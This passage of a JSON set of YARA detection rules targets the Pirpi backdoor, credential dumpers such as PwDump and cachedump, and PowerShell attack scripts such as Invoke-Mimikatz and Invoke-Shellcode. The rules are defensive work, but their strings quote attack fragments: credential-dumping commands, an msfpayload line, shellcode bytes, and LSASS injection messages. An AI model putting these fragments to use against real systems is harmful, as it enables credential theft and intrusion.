\"HARDWARE\\\\DESCRIPTION\\\\System\\\\BIOS\" fullword ascii\n      $s6 = \"12811[%d].gif\" fullword ascii\n      $s7 = \"GetApp03\" fullword wide\n      $s8 = \"flvUpdate\" fullword wide\n      $s9 = \"%d-%4.4d%d\" fullword ascii\n      $s10 = \"http://%s/%5.5d.html\" fullword ascii\n      $s11 = \"flvbho.exe\" fullword wide\n      $op1 = { 74 08 c1 cb 0d 03 da 40 eb } \n      $op2 = { 03 f5 56 8b 76 20 03 f5 33 c9 49 } \n      $op3 = { 03 dd 66 8b 0c 4b 8b 5e 1c 03 dd 8b 04 8b 03 c5 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( $x1 or all of ( $c* ) or all of ( $op* ) ) ) or ( 8 of them )\n}","date":"2016-09-08 09:11:41","description":"Detects Pirpi Backdoor - and other malware (generic rule)","minimum_yara":"1.7","name":"Pirpi_1609_A_RID2AE4","reference":"http://goo.gl/igxLyF","required_modules":[],"rule_hash":"b4b7e337b1e641c942fcb2c3e910f9ab","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Pirpi_1609_B_RID2AE5 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Pirpi Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/igxLyF\"\n      date = \"2016-09-08 09:13:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"tconn <ip> <port> //set temp connect value, and disconnect.\" fullword ascii\n      $s2 = \"E* ListenCheckSsl SslRecv fd(%d) Error ret:%d %d\" fullword ascii\n      $s3 = \"%s %s L* ListenCheckSsl fd(%d) SslV(-%d-)\" fullword ascii\n      $s4 = \"S:%d.%d-%d.%d V(%d.%d) Listen On %d Ok.\" fullword ascii\n      $s5 = \"E* ListenCheckSsl fd(%d) SslAccept Err %d\" fullword ascii\n      $s6 = \"%s-%s N110 Ssl Connect Ok(%s:%d).\" fullword ascii\n      $s7 = \"%s-%s N110 Basic Connect Ok(%s:%d).\" fullword ascii\n      $s8 = \"tconn <ip> <port>\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them ) or ( 4 of them )\n}","date":"2016-09-08 09:13:21","description":"Detects Pirpi Backdoor","minimum_yara":"1.7","name":"Pirpi_1609_B_RID2AE5","reference":"http://goo.gl/igxLyF","required_modules":[],"rule_hash":"37e771945b4ec74ca63c48993a31dc2d","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule pstgdump_RID2A85 : APT DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects a tool used by APT groups - file pstgdump_RID2A85.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/igxLyF\"\n      date = \"2016-09-08 06:33:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\pstgdump_RID2A85.pdb\" ascii\n      $x2 = \"Failed to dump all protected storage items - see previous messages for details\" fullword ascii\n      $x3 = \"ptsgdump [-h][-q][-u Username][-p Password]\" fullword ascii\n      $x4 = \"Attempting to impersonate domain user '%s' in domain '%s'\" fullword ascii\n      $x5 = \"Failed to impersonate user (ImpersonateLoggedOnUser failed): error %d\" fullword ascii\n      $x6 = \"Unable to obtain handle to PStoreCreateInstance in pstorec.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of ( $x* ) ) or ( 3 of them )\n}","date":"2016-09-08 06:33:21","description":"Detects a tool used by APT groups - file pstgdump.exe","minimum_yara":"1.7","name":"pstgdump_RID2A85","reference":"http://goo.gl/igxLyF","required_modules":[],"rule_hash":"6a82cd50d7dd5c507b0656dafc3f5eb4","score":75,"tags":["APT","DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule lsremora_RID2A76 : APT DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects a tool used by APT groups\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/igxLyF\"\n      date = \"2016-09-08 06:08:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Target: Failed to load primary SAM functions.\" fullword ascii\n      $x2 = \"lsremora_RID2A7664.dll\" fullword ascii\n      $x3 = \"PwDumpError:999999\" fullword wide\n      $x4 = \"PwDumpError\" fullword wide\n      $x5 = \"lsremora_RID2A76.dll\" fullword ascii\n      $s1 = \":\\\\\\\\.\\\\pipe\\\\%s\" fullword ascii\n      $s2 = \"x%s_history_%d:%d\" fullword wide\n      $s3 = \"Using pipe %s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of ( $x* ) ) or ( 3 of them )\n}","date":"2016-09-08 06:08:21","description":"Detects a tool used by APT groups","minimum_yara":"1.7","name":"lsremora_RID2A76","reference":"http://goo.gl/igxLyF","required_modules":[],"rule_hash":"fe8c425425ed93eed1e2732290440b48","score":75,"tags":["APT","DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule servpw_RID29B8 : APT DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects a tool used by APT groups - file servpw_RID29B8.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/igxLyF\"\n      date = \"2016-09-08 00:51:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Unable to open target process: %d, pid %d\" fullword ascii\n      $s2 = \"LSASS.EXE\" fullword wide\n      $s3 = \"WriteProcessMemory failed: %d\" fullword ascii\n      $s4 = \"lsremora64.dll\" fullword ascii\n      $s5 = \"CreateRemoteThread failed: %d\" fullword ascii\n      $s6 = \"Thread code: %d, path: %s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them ) or ( all of them )\n}","date":"2016-09-08 00:51:41","description":"Detects a tool used by APT groups - file servpw.exe","minimum_yara":"1.7","name":"servpw_RID29B8","reference":"http://goo.gl/igxLyF","required_modules":[],"rule_hash":"4c44aaef2888b360d207a57fb67437d7","score":75,"tags":["APT","DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule fgexec_RID2983 : APT DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects a tool used by APT groups - file fgexec_RID2983.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/igxLyF\"\n      date = \"2016-09-08 23:23:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\fgexec_RID2983.pdb\" ascii\n      $x2 = \"fgexec_RID2983 Remote Process Execution Tool\" fullword ascii\n      $x3 = \"fgexec_RID2983 CallNamedPipe failed\" fullword ascii\n      $x4 = \"fizzgig and the mighty foofus.net team\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of ( $x* ) ) or ( 3 of them )\n}","date":"2016-09-08 23:23:21","description":"Detects a tool used by APT groups - file fgexec.exe","minimum_yara":"1.7","name":"fgexec_RID2983","reference":"http://goo.gl/igxLyF","required_modules":[],"rule_hash":"5aa34e6a2a246aaca730872c20aff1c8","score":75,"tags":["APT","DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule cachedump_RID2ABB : APT DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects a tool used by APT groups - from files cachedump_RID2ABB.exe, cachedump_RID2ABB64.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/igxLyF\"\n      date = \"2016-09-08 08:03:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Failed to open key SECURITY\\\\Cache in RegOpenKeyEx. Is service running as SYSTEM ? Do you ever log on domain ? \" fullword ascii\n      $s2 = \"Unable to open LSASS.EXE process\" fullword ascii\n      $s3 = \"Service not found. Installing CacheDump Service (%s)\" fullword ascii\n      $s4 = \"CacheDump service successfully installed.\" fullword ascii\n      $s5 = \"Kill CacheDump service (shouldn't be used)\" fullword ascii\n      $s6 = \"cacheDump [-v | -vv | -K]\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of them ) or ( 3 of them )\n}","date":"2016-09-08 08:03:21","description":"Detects a tool used by APT groups - from files cachedump.exe, cachedump64.exe","minimum_yara":"1.7","name":"cachedump_RID2ABB","reference":"http://goo.gl/igxLyF","required_modules":[],"rule_hash":"636450218951b5fc4b6a3438821d6d32","score":75,"tags":["APT","DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule PwDump_B_RID2A0F : APT DEMO EXE FILE HKTL T1003 {\n   meta:\n      description = \"Detects a tool used by APT groups - file PwDump.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/igxLyF\"\n      date = \"2016-09-08 03:16:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, HKTL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineName\" fullword ascii\n      $x2 = \"pwdump6 Version %s by fizzgig and the mighty group at foofus.net\" fullword ascii\n      $x3 = \"where -x targets a 64-bit host\" fullword ascii\n      $x4 = \"Couldn't delete target executable from remote machine: %d\" fullword ascii\n      $s1 = \"lsremora64.dll\" fullword ascii\n      $s2 = \"lsremora.dll\" fullword ascii\n      $s3 = \"servpw.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of ( $x* ) ) or ( 3 of them )\n}","date":"2016-09-08 03:16:41","description":"Detects a tool used by APT groups - file PwDump.exe","minimum_yara":"1.7","name":"PwDump_B_RID2A0F","reference":"http://goo.gl/igxLyF","required_modules":[],"rule_hash":"d424c9dc593ae76f85d29ceb3ec20603","score":75,"tags":["DEMO","T1003","FILE","APT","EXE","HKTL"]},{"author":"Florian Roth","content":"rule ps1_toolkit_PowerUp_RID2EBB : DEMO FILE HKTL {\n   meta:\n      description = \"Semiautomatic generated rule - file PowerUp.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 11:27:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"iex \\\"$Env:SystemRoot\\\\System32\\\\inetsrv\\\\appcmd.exe list vdir /text:vdir.name\\\" | % { \" fullword ascii\n      $s2 = \"iex \\\"$Env:SystemRoot\\\\System32\\\\inetsrv\\\\appcmd.exe list apppools /text:name\\\" | % { \" fullword ascii\n      $s3 = \"if ($Env:PROCESSOR_ARCHITECTURE -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBNAEQANgA0AA==')))) {\" fullword ascii\n      $s4 = \"C:\\\\Windows\\\\System32\\\\InetSRV\\\\appcmd.exe list vdir /text:physicalpath | \" fullword ascii\n      $s5 = \"if (Test-Path  (\\\"$Env:SystemRoot\\\\System32\\\\inetsrv\\\\appcmd.exe\\\"))\" fullword ascii\n      $s6 = \"if (Test-Path  (\\\"$Env:SystemRoot\\\\System32\\\\InetSRV\\\\appcmd.exe\\\")) {\" fullword ascii\n      $s7 = \"Write-Verbose \\\"Executing command '$Cmd'\\\"\" fullword ascii\n      $s8 = \"Write-Warning \\\"[!] Target service\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 4000KB and 1 of them ) or ( 3 of them )\n}","date":"2016-09-04 11:27:01","description":"Semiautomatic generated rule - file PowerUp.ps1","minimum_yara":"1.7","name":"ps1_toolkit_PowerUp_RID2EBB","reference":"https://github.com/vysec/ps1-toolkit","required_modules":[],"rule_hash":"d510e0ac614e929ed688cf2a408d0c9d","score":80,"tags":["DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule ps1_toolkit_Inveigh_BruteForce_RID3303 : DEMO FILE HKTL T1110 {\n   meta:\n      description = \"Semiautomatic generated rule - file Inveigh-BruteForce.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 14:29:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL, T1110\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Import-Module .\\\\Inveigh.psd1;Invoke-InveighBruteForce -SpooferTarget 192.168.1.11 \" fullword ascii\n      $s2 = \"$(Get-Date -format 's') - Attempting to stop HTTP listener\\\")|Out-Null\" fullword ascii\n      $s3 = \"Invoke-InveighBruteForce -SpooferTarget 192.168.1.11 -Hostname server1\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 300KB and 1 of them ) or ( 2 of them )\n}","date":"2016-09-04 14:29:41","description":"Semiautomatic generated rule - file Inveigh-BruteForce.ps1","minimum_yara":"1.7","name":"ps1_toolkit_Inveigh_BruteForce_RID3303","reference":"https://github.com/vysec/ps1-toolkit","required_modules":[],"rule_hash":"41ec377c3bf7d124759b11a50c0d695b","score":80,"tags":["DEMO","T1110","FILE","HKTL"]},{"author":"Florian Roth","content":"rule ps1_toolkit_Invoke_Shellcode_RID3247 : DEMO FILE HKTL {\n   meta:\n      description = \"Semiautomatic generated rule - file Invoke-Shellcode.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 13:58:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Get-ProcAddress kernel32.dll WriteProcessMemory\" fullword ascii\n      $s2 = \"Get-ProcAddress kernel32.dll OpenProcess\" fullword ascii\n      $s3 = \"msfpayload windows/exec CMD=\\\"cmd /k calc\\\" EXITFUNC=thread C | sed '1,6d;s/[\\\";]//g;s/\\\\\\\\/,0/g' | tr -d '\\\\n' | cut -c2- \" fullword ascii\n      $s4 = \"inject shellcode into\" ascii\n      $s5 = \"Injecting shellcode\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 90KB and 1 of them ) or ( 3 of them )\n}","date":"2016-09-04 13:58:21","description":"Semiautomatic generated rule - file Invoke-Shellcode.ps1","minimum_yara":"1.7","name":"ps1_toolkit_Invoke_Shellcode_RID3247","reference":"https://github.com/vysec/ps1-toolkit","required_modules":[],"rule_hash":"b9c8b751388471dc73c72bb5119267c7","score":80,"tags":["DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule ps1_toolkit_Invoke_Mimikatz_RID31FA : DEMO FILE HKTL T1003 T1075 T1097 T1178 {\n   meta:\n      description = \"Semiautomatic generated rule - file Invoke-Mimikatz.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 13:45:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL, T1003, T1075, T1097, T1178\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Get-ProcAddress kernel32.dll WriteProcessMemory\" fullword ascii\n      $s2 = \"ps | where { $_.Name -eq $ProcName } | select ProcessName, Id, SessionId\" fullword ascii\n      $s3 = \"privilege::debug exit\" ascii\n      $s4 = \"Get-ProcAddress Advapi32.dll AdjustTokenPrivileges\" fullword ascii\n      $s5 = \"Invoke-Mimikatz -DumpCreds\" fullword ascii\n      $s6 = \"| Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 10000KB and 1 of them ) or ( 3 of them )\n}","date":"2016-09-04 13:45:31","description":"Semiautomatic generated rule - file Invoke-Mimikatz.ps1","minimum_yara":"1.7","name":"ps1_toolkit_Invoke_Mimikatz_RID31FA","reference":"https://github.com/vysec/ps1-toolkit","required_modules":[],"rule_hash":"3ebee750a46049174ef3c383de38edc9","score":80,"tags":["T1178","T1097","T1075","DEMO","T1003","FILE","HKTL"]},{"author":"Florian Roth","content":"rule ps1_toolkit_Invoke_RelfectivePEInjection_RID36F5 : DEMO FILE HKTL T1055 {\n   meta:\n      description = \"Semiautomatic generated rule - file Invoke-RelfectivePEInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 17:18:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL, T1055\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)\" fullword ascii\n      $x2 = \"Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local\" fullword ascii\n      $x3 = \"} = Get-ProcAddress Advapi32.dll OpenThreadToken\" ascii\n      $x4 = \"Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local\" fullword ascii\n      $s5 = \"$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')\" fullword ascii\n      $s6 = \"= Get-ProcAddress Advapi32.dll AdjustTokenPrivileges\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 700KB and 2 of them ) or ( all of them )\n}","date":"2016-09-04 17:18:01","description":"Semiautomatic generated rule - file Invoke-RelfectivePEInjection.ps1","minimum_yara":"1.7","name":"ps1_toolkit_Invoke_RelfectivePEInjection_RID36F5","reference":"https://github.com/vysec/ps1-toolkit","required_modules":[],"rule_hash":"12c940e6c6c71be6c6d08dfc6675c6b6","score":80,"tags":["T1055","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule ps1_toolkit_Persistence_RID306E : DEMO FILE HKTL {\n   meta:\n      description = \"Semiautomatic generated rule - file Persistence.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 12:39:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\"`\\\"```$Filter=Set-WmiInstance -Class __EventFilter -Namespace ```\\\"root\\\\subscription```\" ascii\n      $s2 = \"}=$PROFILE.AllUsersAllHosts;${\" ascii\n      $s3 = \"C:\\\\PS> $ElevatedOptions = New-ElevatedPersistenceOption -Registry -AtStartup\" ascii\n      $s4 = \"= gwmi Win32_OperatingSystem | select -ExpandProperty OSArchitecture\" ascii\n      $s5 = \"-eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAxADQAQwA='))))\" ascii\n      $s6 = \"}=$PROFILE.CurrentUserAllHosts;${\" ascii\n      $s7 = \"FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBPAG4ASQBkAGwAZQA=')\" ascii\n      $s8 = \"[System.Text.AsciiEncoding]::ASCII.GetString($MZHeader)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )\n}","date":"2016-09-04 12:39:31","description":"Semiautomatic generated rule - file Persistence.ps1","minimum_yara":"1.7","name":"ps1_toolkit_Persistence_RID306E","reference":"https://github.com/vysec/ps1-toolkit","required_modules":[],"rule_hash":"c176c4fc6c316f6bb03b9c6b07bf1c16","score":80,"tags":["DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule ps1_toolkit_Invoke_Mimikatz_RelfectivePEInjection_RID3A9A : DEMO FILE HKTL T1003 T1055 T1075 T1097 T1178 {\n   meta:\n      description = \"Semiautomatic generated rule - from files Invoke-Mimikatz.ps1, Invoke-RelfectivePEInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 19:53:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL, T1003, T1055, T1075, T1097, T1178\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])\" fullword ascii\n      $s2 = \"if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)\" fullword ascii\n      $s3 = \"[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)\" fullword ascii\n      $s4 = \"Function Import-DllInRemoteProcess\" fullword ascii\n      $s5 = \"FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))\" fullword ascii\n      $s6 = \"[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)\" fullword ascii\n      $s7 = \"[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)\" fullword ascii\n      $s8 = \"[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null\" fullword ascii\n      $s9 = \"::FromBase64String('RABvAG4AZQAhAA==')))\" ascii\n      $s10 = \"Write-Verbose \\\"PowerShell ProcessID: $PID\\\"\" fullword ascii\n      $s11 = \"[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 10000KB and 3 of them ) or ( 6 of them )\n}","date":"2016-09-04 19:53:31","description":"Semiautomatic generated rule - from files Invoke-Mimikatz.ps1, Invoke-RelfectivePEInjection.ps1","minimum_yara":"1.7","name":"ps1_toolkit_Invoke_Mimikatz_RelfectivePEInjection_RID3A9A","reference":"https://github.com/vysec/ps1-toolkit","required_modules":[],"rule_hash":"765f37fe067a3dab6f32b23a4bf15595","score":80,"tags":["T1178","T1097","T1075","DEMO","T1003","FILE","T1055","HKTL"]},{"author":"Florian Roth","content":"rule ps1_toolkit_Inveigh_BruteForce_2_RID3394 : DEMO FILE HKTL T1110 {\n   meta:\n      description = \"Semiautomatic generated rule - from files Inveigh-BruteForce.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 14:53:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL, T1110\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"}.NTLMv2_file_queue[0]|Out-File ${\" ascii\n      $s2 = \"}.NTLMv2_file_queue.RemoveRange(0,1)\" ascii\n      $s3 = \"}.NTLMv2_file_queue.Count -gt 0)\" ascii\n      $s4 = \"}.relay_running = $false\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )\n}","date":"2016-09-04 14:53:51","description":"Semiautomatic generated rule - from files Inveigh-BruteForce.ps1","minimum_yara":"1.7","name":"ps1_toolkit_Inveigh_BruteForce_2_RID3394","reference":"https://github.com/vysec/ps1-toolkit","required_modules":[],"rule_hash":"5d826453ea990d0644e9e9fa8c58564c","score":80,"tags":["DEMO","T1110","FILE","HKTL"]},{"author":"Florian Roth","content":"rule ps1_toolkit_PowerUp_2_RID2F4C : DEMO FILE HKTL T1087 {\n   meta:\n      description = \"Semiautomatic generated rule - from files PowerUp.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 11:51:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL, T1087\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if($MyConString -like $([Text.Encoding]::Unicode.GetString([Convert]::\" ascii\n      $s2 = \"FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA=')))) {\" ascii\n      $s3 = \"$Null = Invoke-ServiceStart\" ascii\n      $s4 = \"Write-Warning \\\"[!] Access to service $\" ascii\n      $s5 = \"} = $MyConString.Split(\\\"=\\\")[1].Split(\\\";\\\")[0]\" ascii\n      $s6 = \"} += \\\"net localgroup ${\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 2000KB and 2 of them ) or ( 4 of them )\n}","date":"2016-09-04 11:51:11","description":"Semiautomatic generated rule - from files PowerUp.ps1","minimum_yara":"1.7","name":"ps1_toolkit_PowerUp_2_RID2F4C","reference":"https://github.com/vysec/ps1-toolkit","required_modules":[],"rule_hash":"9cb5e53bf21a45907b6e2ce43ce87e5b","score":80,"tags":["DEMO","T1087","FILE","HKTL"]},{"author":"Florian Roth","content":"rule ps1_toolkit_Persistence_2_RID30FF : DEMO FILE HKTL {\n   meta:\n      description = \"Semiautomatic generated rule - from files Persistence.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 13:03:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBPAG4ASQBkAGwAZQA=')\" ascii\n      $s2 = \"FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBEAGEAaQBsAHkA')\" ascii\n      $s3 = \"FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA==')\" ascii\n      $s4 = \"[Parameter( ParameterSetName = 'ScheduledTaskAtLogon', Mandatory = $True )]\" ascii\n      $s5 = \"FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBBAHQATABvAGcAbwBuAA==')))\" ascii\n      $s6 = \"[Parameter( ParameterSetName = 'PermanentWMIAtStartup', Mandatory = $True )]\" fullword ascii\n      $s7 = \"FromBase64String('TQBlAHQAaABvAGQA')\" ascii\n      $s8 = \"FromBase64String('VAByAGkAZwBnAGUAcgA=')\" ascii\n      $s9 = \"[Runtime.InteropServices.CallingConvention]::Winapi,\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )\n}","date":"2016-09-04 13:03:41","description":"Semiautomatic generated rule - from files Persistence.ps1","minimum_yara":"1.7","name":"ps1_toolkit_Persistence_2_RID30FF","reference":"https://github.com/vysec/ps1-toolkit","required_modules":[],"rule_hash":"077ecc62b9c52a0325ff5ad121c85692","score":80,"tags":["DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule ps1_toolkit_Inveigh_BruteForce_3_RID3395 : DEMO FILE HKTL T1110 {\n   meta:\n      description = \"Semiautomatic generated rule - from files Inveigh-BruteForce.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/vysec/ps1-toolkit\"\n      date = \"2016-09-04 14:54:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL, T1110\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"::FromBase64String('TgBUAEwATQA=')\" ascii\n      $s2 = \"::FromBase64String('KgBTAE0AQgAgAHIAZQBsAGEAeQAgACoA')))\" ascii\n      $s3 = \"::FromBase64String('KgAgAGYAbwByACAAcgBlAGwAYQB5ACAAKgA=')))\" ascii\n      $s4 = \"::FromBase64String('KgAgAHcAcgBpAHQAdABlAG4AIAB0AG8AIAAqAA==')))\" ascii\n      $s5 = \"[Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20)`\" fullword ascii\n      $s6 = 